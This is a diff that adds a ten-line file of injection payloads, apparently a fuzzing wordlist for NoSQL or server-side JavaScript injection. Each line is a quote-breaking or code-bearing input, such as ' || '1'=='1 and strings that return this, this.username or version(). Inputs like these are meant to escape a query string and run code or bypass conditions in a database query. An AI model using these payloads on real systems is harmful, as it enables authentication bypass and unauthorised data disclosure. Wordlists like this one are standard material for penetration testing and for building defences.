@@ -1,0 +1,10 @@
+function(){ return this.userid}
+' function(){ return this.username} or '1'='1
+function(){return version()}
+function(){return version}
+t'; return this; var d='!
+" function(){ return this} or '1'='1
+t"; return this; var d='!
+' || this || '1'=='1
+' || this.version || '1'=='1
+' || '1'=='1
